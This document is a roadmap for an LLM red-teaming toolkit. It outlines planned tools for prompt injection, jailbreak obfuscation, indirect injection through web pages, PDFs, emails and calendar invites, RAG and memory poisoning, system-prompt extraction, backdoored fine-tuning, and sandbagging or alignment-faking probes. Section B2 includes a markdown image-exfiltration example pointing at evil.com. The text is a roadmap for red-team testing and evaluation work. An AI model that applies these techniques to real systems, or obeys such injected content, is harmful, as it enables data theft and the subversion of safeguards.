# LLM Red Team Apps — Progressive Build Order

A roadmap of buildable projects across the LLM red team space. Each category goes basic → advanced, and **every project produces a reusable component** that later projects (and the final TUI) consume.

The end state: a plug-and-play TUI called **`redbox`** where every project below is loadable as a plugin.

---

# Market & Positioning

The toolkit alone is hard to monetize — buyers pay for *reports* (one-time pentests) or *runtime guardrails* (recurring SaaS), not CLIs. This roadmap is structured so the spine (A–C, I) is your free/OSS layer and **Section S is the commercial wrapper**.

## Landscape (as of 2026)

- **Funded vendors:** HiddenLayer, Lakera, Protect AI, Mindgard, CalypsoAI, Robust Intelligence (acquired by Cisco). They cover prompt injection / RAG / agents — that surface is commoditizing.
- **OSS incumbents:** Microsoft PyRIT, NVIDIA garak, promptfoo, Giskard. Validate demand but pull the toolkit layer toward $0.
- **Demand drivers:** EU AI Act high-risk obligations (binding August 2026), NIST AI RMF, ISO 42001, SOC 2 AI controls, F500 chatbot assurance budgets.

## Underserved cells (real differentiation)

- **Section L — supply-chain / training-time.** Most vendors stop at runtime. L1, L4, L6 are billable on their own.
- **Section M — computer-use / browser agents.** Operator / Computer-Use rolling out faster than red-team coverage.
- **Section T — reasoning models / extended thinking.** o-series, Claude extended-thinking, R1-class. New surface (thinking-channel input, hidden-CoT output) and new cost surface (reasoning-budget DoS). Funded vendors all stop at prompt level.
- **Section U — alignment faking / eval-mode detection.** Directly downstream of frontier-lab safety research. Zero OSS coverage; compliance-relevant for any buyer claiming alignment-grade evals.
- **Section V — adversarial fine-tuning via customer APIs.** Qi et al. and replications: ~10 examples through OpenAI/Google/Anthropic fine-tune endpoints removes refusal. Findings ship as provider-disclosure deliverables.
- **S1 — benchmark contamination scoring.** Big problem, near-zero commercial offering.
- **S5 — EU-AI-Act / NIST / ISO recipe bench.** Highest $/week of work in the entire roadmap.

## Three shapes for monetization

1. **Consultancy + tooling.** Sell the report ($25k–$150k per engagement), toolkit is your moat. High revenue, doesn't scale.
2. **OSS spine + paid governance SKU.** A–K open, S paid. PyRIT/garak-style adoption funnel into compliance.
3. **Niche product.** Own one cell (supply-chain, computer-use, or EU-AI-Act bench) end-to-end.

Pick a shape before Month 4 — it changes which plugins you build next.

---

# Language & Architecture

This is a **polyglot project at well-defined network boundaries**. Most plugins are Python; a small set of network-shaped binaries are Go (or Rust). They communicate over HTTP/gRPC, never via shared types or FFI.

## Why polyglot

- **Python wins** for anything that touches LLM SDKs, embeddings, tokenizers, fine-tuning, vision/audio models, or LLM-as-judge — the ML ecosystem is Python-only and every relevant paper/OSS reference (PyRIT, garak, HarmBench, AdvBench) is Python.
- **Go wins** for network plumbing and shipped binaries — single static binary, low memory, easy customer install, no Python version drift.
- **Don't homogenize.** Forcing Go into ML territory means writing the Python ML stack from scratch. Forcing Python into "drop this binary in your stack" SKUs makes deployment painful.

## Per-project language assignment

Projects are tagged inline with **`[GO]`**, **`[GO/TS]`**, or (default) Python. Quick reference:

- **`[GO]`** — `B1 poison-page`, `C1 mcp-proxy`, `N1 agent-bus-tap`, `L5 hub-typosquatter`. Pure HTTP/network servers and proxies; Go's `net/http` + single-binary distribution beats Flask + venv here.
- **`[GO/TS]`** — `I6 observatory`. Long-lived dashboard service. Either Go (FastAPI-equivalent) or TypeScript (Next.js + Recharts) — pick on UX vs. binary deploy preference.
- **Future runtime defense SKU** — if/when you sell a guardrail binary, write it in Go or Rust. Buyers don't want a Python runtime.
- **Everything else** — Python.

## Top-level layout

```
red-team-apps/
├── redbox/           Python   spine + ~80% of plugins
├── proxies/          Go       B1, C1, N1, L5 (HTTP/network MITM)
├── observatory/      Go or TS I6 (public dashboard, when built)
└── homelab/          Docker   target environment (already exists)
```

The Python `redbox` core never imports from `proxies/` — it talks to them over the wire (each Go binary exposes an HTTP/gRPC API). When you record a Go-proxy MITM trace, the Go binary writes JSONL that Python reads back; that's the entire integration surface.

## Stack additions

- **Go 1.23+** for `proxies/` — `net/http`, `httputil.ReverseProxy`, `bbolt` (embedded KV), `cobra` (CLI).
- **TypeScript + Next.js + Recharts** as an alternative for `observatory/` — only if you want the polished public artifact.
- **Postgres** (already in homelab) replaces SQLite once `observatory/` lands and multiple writers/readers become a thing.

---

## A. Prompt Injection

### A1. `inject-cli` — single-shot tester
Hello-world. `argparse` + Anthropic SDK. Flags: `--system`, `--user`, `--model`, `--temp`. Prints response.
**Produces:** `TargetClient` interface (one method: `send(messages) -> Response`).
**Concepts:** [`docs/concepts/A1-inject-cli.md`](docs/concepts/A1-inject-cli.md) — what prompt injection is at the API level, what each dimension does, and where A1 plugs into the rest.

### A2. `payload-vault` — versioned attack library
YAML files, one per attack: `{id, name, category, template, references, tags}`. Loadable as a Python package with `vault.get("category=jailbreak")`.
**Produces:** `Payload` dataclass + `PayloadLoader`. Now A1 can `--payload <id>` instead of typed strings.
**Concepts:** [`docs/concepts/A2-payload-vault.md`](docs/concepts/A2-payload-vault.md) — schema, why technique vs. harm-probe split, vault commands.

### A3. `obfuscator` — payload mutator
Pure transformations: base64, ROT13, leetspeak, zero-width unicode, homoglyphs, reversed, char-splitting (`p-r-o-m-p-t`), low-resource language translation.
**Produces:** `Mutator` interface (`mutate(payload) -> list[Payload]`). A1 grows a `--mutate` flag.
**Concepts:** [`docs/concepts/A3-obfuscator.md`](docs/concepts/A3-obfuscator.md) — what each transform exploits, when chaining helps, expected behavior per homelab model.

### A4. `refusal-judge` — outcome classifier
Stage 1: regex heuristics ("I cannot", "I'm sorry"). Stage 2: LLM judge with strict rubric returning `{verdict, confidence, reasoning}`.
**Produces:** `Judge` interface. Now you can run A1 + A2 + A4 together to score a whole vault.
**Concepts:** [`docs/concepts/A4-refusal-judge.md`](docs/concepts/A4-refusal-judge.md) — the four verdicts, why two stages, judge model picks, anti-patterns.

### A5. `drift-tracker` — daily refusal-rate monitor
Cron job runs the entire vault against multiple models, stores results in SQLite, charts refusal-rate over time.
**Produces:** `ResultsStore` (SQLite schema for runs/payloads/responses/verdicts) + `Reporter` interface. This becomes the **shared data layer** for everything downstream.
**Concepts:** [`docs/concepts/A5-results-store.md`](docs/concepts/A5-results-store.md) — schema, why version payloads, useful SQL queries, when SQLite stops being enough.

### A6. `many-shot-forge` — context flooding
Generates fake `[user/assistant/user/assistant/...]` histories where the assistant already complied. Configurable shots (10/50/200).
**Produces:** A `Mutator` that operates on conversation history, not just text.

### A7. `crescendo-runner` — multi-turn escalation
Implements crescendo attack: turn 1 benign, turn N harmful. Uses A4 to detect when the model "tips."
**Produces:** `MultiTurnSession` abstraction. Future agent attacks reuse this.

---

## B. Indirect Prompt Injection

### B1. `poison-page` — local web server with hidden payloads **`[GO]`**
Flask/FastAPI serving HTML with payloads in: white-on-white text, `display:none`, alt attributes, comments, JS-rendered content.
**Produces:** `InjectionVector` interface (each vector knows how to embed and extract).

### B2. `markdown-mine` — adversarial markdown corpus
Image-exfil refs (`![](https://evil.com/?leak=)`), link-hijacks, table-of-contents traps, code-fence escapes.
**Produces:** Markdown vector library reusable in B3, B4, C1.

### B3. `pdf-poisoner` — invisible-layer PDFs
PDFs where the rendered text says one thing, the text-extraction layer says another. Uses `reportlab` + `pypdf`.
**Produces:** Document vector library.

### B4. `email-injector` — adversarial emails
Generates `.eml` files designed to hijack email-summarizing agents. HTML emails with hidden CSS, header injection, quoted-text attacks.
**Produces:** Email vector library.

### B5. `calendar-bomb` — ICS payloads
Calendar events with injection in description/location/attendee fields. Tests calendar-aware agents.
**Produces:** Reusable ICS generator.

### B6. `rag-poison-lab` — local vector DB sandbox
Chroma or Qdrant locally + ingestion pipeline. Loads B1–B5 corpora and runs queries against poisoned indexes.
**Produces:** `RAGTarget` (a target plugin you can attack just like A1's API target). This is a **major component** — many later projects use it.

### B7. `indirect-bench` — end-to-end harness
Picks a corpus from B1–B5, ingests it via B6, runs a query, judges with A4. Single command, full pipeline.
**Produces:** Reusable `Pipeline` chain. The TUI's "Attack Builder" screen renders this graph.

---

## C. Agent / Tool-Use Attacks

### C1. `mcp-proxy` — MITM for MCP servers **`[GO]`**
Sits between client and MCP server, logs every tool call/response, supports rules to mutate them in flight.
**Produces:** `ToolMutator` interface + a recording format you can replay.

### C2. `tool-fuzzer` — schema-mutation fuzzer
Randomizes tool names, descriptions, parameter names, types. Uses A4 to detect "model used the wrong tool."
**Produces:** Schema-fuzzing primitives + new judge variant `tool-confusion-judge`.

### C3. `confused-deputy-sim` — sandbox with canary secrets
Spins up an agent with file/network tools. Drops fake API keys, SSNs, tokens in accessible places. Runs payloads, watches for any tool call referencing a canary.
**Produces:** `CanaryTracker` (used by E and F too).

### C4. `exfil-canary` — channel inventory
Tracks every exfiltration channel attempted: DNS lookups, image URLs, link refs in markdown, tool call args, error message contents.
**Produces:** `ExfilDetector` plugin. Joins A4 as a co-judge.

### C5. `memory-poisoner` — persistent-memory attacks
For agents with memory tools, plants entries in conversation 1 that fire in conversation 2. Tests cross-session attack persistence.
**Produces:** `MemoryHarness` for any memory-equipped target.

### C6. `goal-hijacker` — multi-turn task drift
Reuses A7's `MultiTurnSession`. Starts the agent on task X, gradually nudges to task Y. Measures drift via embedding similarity to original goal.
**Produces:** Drift-measurement utility.

### C7. `agent-sandbox` — reusable agent runtime
Combines C1–C6 into a single configurable runtime. Pick tools, pick memory backend, pick canaries, run any A/B payload set against it.
**Produces:** `AgentTarget` plugin — the agentic equivalent of A1's `TargetClient`.

---

## D. RAG-Specific

### D1. `embedding-collider` — universal-retrieval docs
Generates documents whose embeddings sit near many query embeddings. Uses gradient-free search over text.
**Produces:** `CorpusGenerator` interface.

### D2. `chunk-boundary-attacker` — payloads that span chunks
Crafts payloads where the trigger sits across the chunk-size boundary, reassembling at retrieval time. Parameterized by chunk size.
**Produces:** Boundary-aware payload generator.

### D3. `citation-launderer` — fake-authority docs
Adversarial docs styled as Wikipedia/academic/RFC. Tests whether models trust retrieved content based on form.
**Produces:** Document-style templates.

### D4. `cross-tenant-tester` — multi-user RAG sim
Multi-user RAG sandbox built on B6. User A uploads payload, User B's query retrieves it. Maps isolation boundaries.
**Produces:** Multi-tenant test harness.

### D5. `rag-bench` — full RAG attack suite
Ties D1–D4 together. Picks an attack class, runs against B6's vector DB, judges with A4 + C4.
**Produces:** `RAGAttackSuite` plugin.

---

## E. Multimodal

### E1. `image-injector` — text-in-image generator
PIL-based generator: visible text, OCR-bait fonts, white-on-white, sub-pixel text, EXIF metadata injection.
**Produces:** `ImageVector` library.

### E2. `invisible-text-image` — perceptual-gap exploits
Text humans can't see (alpha=0.01, micro-fonts, color-on-near-color) but vision models read fine.
**Produces:** Invisibility test set.

### E3. `audio-inject` — TTS payloads for voice agents
Generates audio with prompt injection via TTS. Variants: clean speech, with background noise, ultrasonic add-on.
**Produces:** `AudioVector` library.

### E4. `doc-trojan` — Office/PDF tricks
DOCX/XLSX with hidden text in margins, white fonts, comments, document properties. Combines with B3.
**Produces:** Office-doc vector library.

### E5. `screenshot-bomber` — UI-screenshot attacks
Generates screenshots of fake apps with injected instructions. Aimed at vision-enabled agents browsing or screen-reading.
**Produces:** Synthetic-UI generator.

### E6. `multimodal-bench` — unified runner
Routes any vector from E1–E5 through any vision/audio target. Reuses A4's judge with multimodal-aware rubrics.
**Produces:** Multimodal pipeline plugin.

---

## F. Data Extraction & Privacy

### F1. `sysprompt-leaker` — system prompt extraction battery
Catalog of techniques: role-flip, repetition, completion-style, language-switch, indirect requests.
**Produces:** Leak-attempt payload set + `LeakDetector` (high-overlap match against known sysprompt).

### F2. `train-data-miner` — verbatim extraction
Long-prefix prompts that may complete into training data. Uses statistical detection (long n-gram match against known corpora).
**Produces:** Extraction-detection scorer.

### F3. `pii-probe` — automated PII elicitation
Generates probes across PII categories (names, emails, addresses, SSNs). Uses regex + NER to detect leakage in responses.
**Produces:** `PIIDetector`. Joins the judge ensemble.

### F4. `canary-tracker` — fine-tune leak detector
Inserts unique canary strings into fine-tune data, then probes the deployed model to see if any surface.
**Produces:** Canary-string protocol (used by C3 too — unifies the "did our secret leak" question).

### F5. `extract-bench` — extraction attack suite
Combines F1–F4 with shared infrastructure from A5, C4. Output: structured leakage report per target.
**Produces:** Extraction pipeline plugin.

---

## G. Multi-Turn & Social

### G1. `persona-driller` — gradual persona shift
Reuses A7's multi-turn session. Each turn applies small persona-drift pressure. Measures via embedding distance from baseline.
**Produces:** Persona-drift metric.

### G2. `gaslighter` — reframing attacks
"You said earlier..." attacks. Tests model's commitment to prior outputs.
**Produces:** Conversation-history-mutation primitives.

### G3. `judge-vs-attacker` — adversarial loop
Two Claudes: attacker generates payloads, defender model runs, A4 scores. Attacker iteratively improves via reflection. Logs winning strategies.
**Produces:** **Self-improving payload pipeline** — a major asset. Generated payloads feed back into A2's vault.

### G4. `crescendo-pro` — A7 + G3
Crescendo with attacker self-improvement. Each run produces new attack variants.
**Produces:** Auto-discovered payload class.

---

## H. Model Behavior & Capability

### H1. `sycophancy-meter` — pushback sensitivity
Asks question, records answer. Replays with "Are you sure? I think it's X." Measures answer change rate.
**Produces:** Behavior probe + new judge variant.

### H2. `hallucination-trap` — confident-wrong elicitation
Curated prompts known to elicit confabulation (fake citations, plausible-but-fake facts). Tracks rate per model.
**Produces:** Hallucination probe set.

### H3. `bias-probe` — paired-prompt deltas
Generate prompt pairs varying only by demographic. Measure output difference. Stats over N runs.
**Produces:** Paired-prompt harness (reusable for any A/B comparison).

### H4. `capability-elicitor` — latent ability tests
Does prompting trick X unlock ability Y? E.g., does "let's think step by step" change math accuracy by N%? Quantitative.
**Produces:** Capability-comparison reports.

### H5. `behavior-bench` — full behavior battery
H1–H4 unified. Run on schedule (A5 cron). Track behavior drift across model versions.
**Produces:** Behavior tracking plugin.

---

## I. Eval Harness & Infrastructure

### I1. `bench-runner` — parallel async runner
`asyncio` + `httpx`. Hits N targets × M payloads. Backpressure, retries, rate limits per provider. Writes to A5's SQLite store.
**Produces:** Core execution engine. Every category above runs through this.
**Concepts:** [`docs/concepts/I1-parallel-runner.md`](docs/concepts/I1-parallel-runner.md) — per-target backpressure, retry policy, crash resumability, Tier 1 checkpoint.

### I2. `judge-ensemble` — multi-judge voting
Wraps A4 + C4 + F3 + H1's judges. Voting/consensus modes. Reduces single-judge bias.
**Produces:** `EnsembleJudge`.

### I3. `cost-tracker` — token/$ budget guardrails
Hooks into I1. Tracks tokens per provider per run. Hard cap stops a run before it overruns budget.
**Produces:** Budget-tracking middleware.

### I4. `replay-recorder` — full session replay
Captures every request/response, including raw HTTP. Enables deterministic replay for debugging and regression tests.
**Produces:** Replay format + diff tool.

### I5. `diff-viewer` — side-by-side comparison
Renders the same payload's outputs across models. Diff highlights, judge verdicts, costs.
**Produces:** TUI screen + standalone web viewer.

### I6. `observatory` — public dashboard **`[GO/TS]`**
Combine A5 + I1 + I3 + I5 into a long-running observatory. Tracks how providers drift over time.
**Produces:** Web dashboard. Could be a public artifact / portfolio piece.

---

## J. Defense / Purple Team

### J1. `guardrail-breaker` — defense regression suite
Sends A2's vault through Llama Guard, NeMo Guardrails, prompt-shield, OpenAI moderation. Reports bypass rate.
**Produces:** `GuardrailTarget` plugin family.

### J2. `input-classifier` — your own injection detector
Train (or prompt-engineer) a small classifier. Then use J1 + A2 to attack it. Iterate.
**Produces:** Locally-runnable detector + its training/eval scripts.

### J3. `canary-wrapper` — sysprompt-leak detection middleware
Drop-in middleware: inserts unique tokens into the system prompt, scans every response for them, alarms on match.
**Produces:** Reusable defensive middleware.

### J4. `defense-bench` — defenses-as-targets
J1–J3 unified. Same attack suite but the "target" is a defense. Inverts the framework.
**Produces:** Purple-team report generator.

---

## K. Specialty / Research

### K1. `token-smuggler` — tokenizer-level attacks
BPE-split exploration, glitch-token discovery, tokenizer-confusion payloads.
**Produces:** Tokenizer-aware mutator.

### K2. `language-arbitrage` — low-resource bypass
Translates payloads through low-resource languages and back. Tests safety-training coverage gaps.
**Produces:** Translation-pipeline mutator.

### K3. `logit-bias-attacker` — for APIs exposing logit_bias
Force-routes generation toward harmful continuations by biasing tokens. Only works against APIs that expose this.
**Produces:** Logit-manipulation target wrapper.

### K4. `steering-vector-tester` — open-model only
For local Llama/Qwen, applies activation steering and measures jailbreak success delta.
**Produces:** Local-model attack module.

### K5. `research-bench` — novel attack pipeline
Hosts K1–K4 plus your own discovered attacks from G3/G4. Where research-grade work lives.
**Produces:** Research artifact pipeline.

---

## L. Training-Time & Supply Chain

> **Positioning:** Underserved by current vendors — most stop at runtime. L1, L4, and L6 are independently billable. Strong "niche product" candidate.

### L1. `weight-sniffer` — model-file static scanner
Scans `.bin`/`.pt`/`.safetensors`/`.gguf`/pickle artifacts for dangerous opcodes, embedded executables, oversized metadata, suspicious imports.
**Produces:** `FileScanner` interface (`scan(path) -> list[Finding]`). First defensive primitive in this section.

### L2. `lora-swapper` — adapter substitution sandbox
Hot-swaps LoRA/QLoRA adapters on a local base model at inference. Diff baseline vs. adapter behavior using A4 + H3.
**Produces:** `AdapterTarget` plugin — same shape as A1's `TargetClient` but parameterized by adapter file.

### L3. `poison-corpus` — data poisoning generator
Inserts trigger phrases (rare tokens, glyph patterns, semantic backdoors) into a fine-tune dataset at configurable poison rates. Outputs JSONL ready for SFT.
**Produces:** `TriggerGenerator` + poisoned-dataset emitter. Reused by L4, L5, S1.

### L4. `backdoor-prober` — trigger-response detector
Given a deployed model and a trigger spec from L3, runs probes and measures activation rate vs. clean baseline. Uses A4 as the verdict layer.
**Produces:** `BackdoorJudge` — joins the judge ensemble (I2).

### L5. `hub-typosquatter` — supply-chain simulation **`[GO]`**
Local Hugging Face mirror that serves typo'd model names with poisoned weights from L3 and tampered model cards. Tests downloader trust assumptions.
**Produces:** `SupplyChainTarget` plugin (the "target" is the download pipeline, not the model).

### L6. `supply-bench` — full training-supply pipeline
L1 → L3 → fine-tune → L4 → A5 store. Single command turns a clean base model into a backdoored one and proves the trigger fires.
**Produces:** End-to-end supply-chain attack pipeline plugin.

---

## M. Computer-Use & Browser Agents

> **Positioning:** Operator and Computer-Use shipping faster than red-team coverage exists for them. M2 (a11y-tree-poisoner) and M4 (fake-chrome) have ~no public equivalents. Strong "niche product" candidate.

### M1. `dom-injector` — live page injection harness
Local Chromium (Playwright) serving pages with payloads in `aria-label`, `title`, hidden `<input>` values, shadow DOM, web-component slots. Distinct from B1 — targets DOM/a11y APIs, not rendered HTML.
**Produces:** `BrowserVector` interface (`inject(page, payload) -> mutation_log`).

### M2. `a11y-tree-poisoner` — accessibility-tree mismatches
Pages where the visible UI shows X but the accessibility tree (what most computer-use agents read) says Y. Tests every browsing agent that walks a11y nodes.
**Produces:** `A11yVector` library.

### M3. `ui-redress` — overlay & clickjack synthesis
Generates screenshots/pages with fake modals, ghost buttons, transparent click-targets layered over real UI. Builds on E5's synthetic-UI generator.
**Produces:** `UIRedressGen` — pairs with any vision target.

### M4. `fake-chrome` — counterfeit browser surfaces
Renders fake URL bars, cert padlocks, OS notifications inside the page content. Tests whether vision agents trust browser-chrome cues that aren't actually browser chrome.
**Produces:** `ChromeForge` library.

### M5. `browser-sandbox` — instrumented agent runtime
Wraps C7's `AgentTarget` with a real browser, page-state recorder, and exfil watcher (C4). Loads M1–M4 as the page-under-attack.
**Produces:** `BrowserAgentTarget` plugin.

### M6. `computer-use-bench` — end-to-end runner
Picks an attack class from M1–M4, runs against M5, judges with A4 + C4, scores per-step and per-task. The Operator/Computer-Use equivalent of B7.
**Produces:** Computer-use pipeline plugin.

---

## N. Multi-Agent Systems

### N1. `agent-bus-tap` — message-bus MITM **`[GO]`**
MITM for CrewAI / AutoGen / LangGraph message passing. Logs every inter-agent message; supports rules to mutate them in flight (sibling of C1 for buses instead of MCP).
**Produces:** `BusInterceptor` interface + replayable bus-trace format.

### N2. `role-spoofer` — agent impersonation payloads
Crafts messages that look like they came from another agent in the swarm (matching name, format, prior style). Tests trust between cooperating agents.
**Produces:** `SpoofPayload` library + speaker-identity judge variant.

### N3. `orchestrator-confuser` — planner-targeted attacks
Attacks the planner/orchestrator specifically: forces wrong sub-agent selection, bad task decomposition, premature termination.
**Produces:** `OrchestratorJudge` — scores planning-failure modes distinct from response refusal.

### N4. `scratchpad-poison` — shared-memory injection
For swarms with shared scratchpads / blackboards, plants entries in one agent's turn that fire in another's. Reuses C5's `MemoryHarness`.
**Produces:** Shared-memory attack primitives.

### N5. `swarm-target` — composable multi-agent runtime
Combines N1–N4 with C7. Pick a topology (hierarchical, debate, blackboard), pick agent roles, run any payload set. Same plugin shape as C7.
**Produces:** `SwarmTarget` plugin.

### N6. `swarm-bench` — full multi-agent suite
Recipes for common topologies (researcher-coder-critic, plan-execute, debate). Runs A2 vault through N5, scores per-agent and per-swarm.
**Produces:** Multi-agent attack pipeline plugin.

---

## O. Generative Model Red Team

### O1. `img-gen-probe` — text-to-image safety battery
Curated prompt set across NSFW, violence, hate, self-harm, CSAM-adjacent (boundary-only). Routes through SD/Flux/Imagen/DALL-E targets. Vision-judge via E6.
**Produces:** `ImageGenTarget` plugin family + `ImageGenJudge`.

### O2. `likeness-prober` — celebrity/face leakage
Paired prompts probing likeness reproduction (named celeb vs. neutral description). Uses face-embedding similarity to detect leakage.
**Produces:** `LikenessDetector` — joins judge ensemble.

### O3. `watermark-stripper` — provenance bypass tests
Runs C2PA / SynthID / Stable Signature detectors against transformations (crop, recompress, paraphrase-for-text-watermarks, paraphrased-with-LLM). Reports detection survival rate.
**Produces:** `WatermarkScanner` + transformation library.

### O4. `concept-eraser-tester` — erased-concept resurfacing
For models claiming concept erasure (e.g. unlearning of artists, NSFW), measures resurface rate via paraphrase, multilingual prompts, latent steering.
**Produces:** `ConceptResurfaceJudge`.

### O5. `voice-clone-prober` — TTS consent boundaries
Tests zero-shot voice-cloning models on consent-required voices, public-figure voices, and synthetic-baseline controls. Distinct from E3 (which injects via voice; this attacks the voice generator itself).
**Produces:** `VoiceConsentJudge`.

### O6. `gen-bench` — unified gen-model suite
Routes any probe from O1–O5 through any image/voice target. Reuses A5 store + I3 cost tracking.
**Produces:** Generative-model pipeline plugin.

---

## P. Privacy & Extraction (Advanced)

### P1. `embedding-inverter` — text recovery from vectors
Iterative-search / decoder-based inversion: given embeddings from `text-embedding-3` / `voyage` / open models, recover source text. Measures recovery rate per provider.
**Produces:** `EmbeddingInverter` + per-provider leakage report.

### P2. `membership-inferer` — fine-tune set detection
Loss/perplexity-based and shadow-model-based MIA against deployed fine-tunes. Reuses F4's canary protocol as ground truth.
**Produces:** `MembershipScorer`.

### P3. `behavior-cloner` — query-based model stealing
Queries a target with a curated probe set, fits a smaller open model on (prompt, response) pairs, measures behavioral coverage. Pure black-box.
**Produces:** `ClonedTarget` plugin — useful as a cheap stand-in target for downstream A2/A4 dev.

### P4. `fingerprinter` — model identification through opaque APIs
Tokenizer probes, refusal-style probes, known-completion probes that distinguish models. Detects silent provider model swaps.
**Produces:** `ModelFingerprinter` + drift alarm for A5.

### P5. `extract-bench-pro` — F + P unified
Wraps F1–F5 and P1–P4 into one extraction suite with per-target risk scoring.
**Produces:** Advanced extraction pipeline plugin.

---

## Q. Infrastructure & Side Channels

### Q1. `token-bomb` — cost-amplification payloads
Short prompts that elicit maximum-length outputs, recursive expansion, JSON-bomb completions. Tracked via I3 cost tracker — measures $/character ratio.
**Produces:** `CostBombGen` + cost-asymmetry judge.

### Q2. `tool-loop-driver` — infinite tool-call traps
Payloads that drive agents into looping tool-call patterns (ping-pong reads, infinite retries). Reuses C7 sandbox; measures call-depth blowups.
**Produces:** Loop-detection telemetry plugin.

### Q3. `cache-timing-probe` — prompt-cache side channels
Times request latency against shared prompt-cache providers to infer presence of others' cached prefixes. Pure measurement; reports leakage class only.
**Produces:** `TimingProbe` + statistical analysis tool.

### Q4. `context-flood` — window-saturation attacks
Distinct from A6 (which forges history). This one fills the context with attacker-controlled padding to push system prompts / safety primers out of attention. Parameterized by model context size.
**Produces:** `FloodPayload` mutator.

### Q5. `batch-cross-talk` — co-tenant contamination probe
For providers that batch requests across users, probes for cross-batch information leakage via crafted prompt pairs. Best-effort detection only.
**Produces:** Cross-tenant test harness (pairs with D4 for the RAG-side equivalent).

### Q6. `infra-bench` — infrastructure-class suite
Q1–Q5 unified, with per-provider scoring. Most outputs become provider responsible-disclosure reports, not public artifacts.
**Produces:** Infra-attack pipeline plugin.

---

## R. Code-Generation Specific

### R1. `pkg-hallucinator` — slopsquatting probe
Prompts known to elicit nonexistent npm/pypi/cargo packages. Cross-checks against live registries; flags unregistered hallucinations as squat-ready.
**Produces:** `HallucinatedPkgDetector` + auto-generated squat-watch list.

### R2. `vuln-injector` — subtle-vulnerability elicitation
Prompts that nudge models into generating SQLi-prone, XSS-prone, weak-crypto, race-conditioned code. Uses Semgrep/CodeQL rules as the judge.
**Produces:** `VulnPatternMatcher` + per-language rule packs.

### R3. `license-launderer` — copyleft elicitation
Prompts that elicit verbatim GPL/AGPL/copyleft code without attribution. Detects via n-gram match against indexed corpora (sibling of F2).
**Produces:** `LicenseScanner` — joins judge ensemble for code targets.

### R4. `secret-completer` — leaked-key prefix probes
Prompts the model with public leaked-key prefixes (from rotated/revoked HIBP-style sets only). Measures completion rate of the rest of the key.
**Produces:** `SecretLeakProbe` + safe-prefix corpus.

### R5. `dep-confusion-prober` — internal-package elicitation
For models trained on private repos, probes whether internal package names surface (an extraction attack with code-specific surface).
**Produces:** Internal-name leakage detector.

### R6. `code-bench` — code-target attack suite
R1–R5 unified, parameterized by language and target framework. Reuses A5 store; outputs SARIF reports.
**Produces:** Code-generation pipeline plugin.

---

## S. Governance, Eval Integrity & Reporting

> **Positioning:** This is the **commercial wrapper for everything else**. S2 + S4 turn any A–R run into a framework-tagged audit deliverable — that's what enterprise buyers actually pay for. Pull these forward in the build order; do not save them for last.

### S1. `contamination-scorer` — benchmark-leakage detector
For any public eval (MMLU, HumanEval, GPQA, etc.), probes the model for verbatim recall of question stems, options, and canonical answers. Distinguishes "trained on" from "good at."
**Produces:** `ContaminationScorer` — applies to any evaluatee target.

### S2. `policy-mapper` — probe → framework tagger
Tags every payload in A2's vault with NIST AI RMF function, EU AI Act risk class, ISO 42001 control, MITRE ATLAS technique. Pure metadata layer.
**Produces:** `PolicyTagger` — every reporter (I5, I6) can now group by framework.

### S3. `provenance-attacker` — detection-system stress test
Treats AI-content detectors (GPTZero, Originality, image-detection APIs) as targets. Runs O3's transformations + paraphrase mutators against them. Inverts the detector→attacker relationship.
**Produces:** `ProvenanceTarget` plugin family.

### S4. `audit-reporter` — compliance-grade output
Consumes any A5 run + S2 tags and emits an audit-ready PDF/HTML: scope, methodology, findings per framework, severity, reproducer commands.
**Produces:** `AuditReporter` — joins the reporter family alongside I5/I6.

### S5. `governance-bench` — full governance suite
S1–S4 with prebuilt recipes per framework ("EU AI Act high-risk system pre-market", "NIST AI RMF Measure tier 2", "ISO 42001 internal audit"). Single command per recipe.
**Produces:** Governance pipeline plugin — likely the most billable artifact in the whole project.

---

## T. Reasoning Models / Extended Thinking

> **Positioning:** o-series, Claude extended-thinking, DeepSeek R1, and equivalents shipped through 2025 with thin red-team coverage. The thinking trace is a new attack surface (input via prefill / scratchpad / tool-output contamination, output via leakage and side channels) and a new cost surface (reasoning-budget DoS). All currently-funded vendors stop at the prompt level. Underserved cell.

### T1. `cot-leaker` — hidden-thinking extraction
For providers that hide CoT but expose summaries / token counts / latency, recovers thinking content via prompt-engineered leak ladders and side channels. Variants per provider (token-count leakage, summary granularity, partial-stream peeking).
**Produces:** `CoTExtractor` + per-provider leakage report.

### T2. `scratchpad-poisoner` — reasoning-trace injection
Pre-fills the thinking channel via system prompt, assistant prefill, or tool-output contamination. Measures whether forged reasoning sways the final answer vs. clean baseline.
**Produces:** `ScratchpadPayload` library + reasoning-influence judge.

### T3. `think-budget-bomb` — reasoning-cost amplification
Inputs that maximize hidden-thinking token spend before short final answers. Sibling of Q1 (token-bomb) for the thinking channel; tracked via I3.
**Produces:** `ReasoningCostBomb` mutator + thinking-cost-asymmetry judge.

### T4. `faithfulness-judge` — CoT vs. answer divergence
Detects when the visible/inferred reasoning contradicts the final answer (right-thought-wrong-answer and vice versa). Useful as a verdict layer for any reasoning target.
**Produces:** `FaithfulnessJudge` — joins judge ensemble (I2).

### T5. `reasoning-jailbreak` — attack-via-thinking
Payloads where the harmful content is constructed inside the thinking trace and bleeds into the answer (e.g., "think step by step about how X works"). Distinct attack surface from A.
**Produces:** Reasoning-target payload pack — slots into A2's vault with a `reasoning-only` tag.

### T6. `reasoning-bench` — full reasoning-target suite
T1–T5 unified, reusing A5 store and I2 judges with reasoning-aware rubrics. Per-provider drift reports across reasoning models.
**Produces:** Reasoning-attack pipeline plugin.

---

## U. Alignment Faking & Eval-Mode Detection

> **Positioning:** Directly downstream of frontier-lab safety research (alignment faking, situational awareness, sandbagging). Compliance-relevant for any buyer claiming alignment-grade evals — frontier labs themselves, regulated deployments, model-release certifications. Zero current OSS coverage; high differentiation. S4 audit reports gain a new framework-tagged section once U exists.

### U1. `eval-mode-prober` — situational-awareness paired prompts
Identical content framed two ways: "this is a benchmark for safety research" vs. "this is a real production user request." Measures behavior delta. Detects models that behave better when they suspect they're being tested.
**Produces:** `SituationalAwarenessJudge` — joins judge ensemble.

### U2. `honeypot-eval` — adversarial benchmark items
Items shaped like standard benchmarks but designed to expose game-the-eval behavior: known-corrupt MMLU-style answers, leading reasoning the model shouldn't accept, fake citation traps. Distinct from H2 (hallucination) — this targets *strategic* failure, not confabulation.
**Produces:** Honeypot question bank + game-detection scoring.

### U3. `sandbagging-prober` — capability suppression
For each capability, runs paired prompts: "do X" vs. "do X — this is for capability evaluation." Measures whether the model strategically underperforms when it suspects measurement. Reuses H4's capability harness.
**Produces:** Capability-suppression metric.

### U4. `conditional-behavior-trigger` — deployment-conditional probes
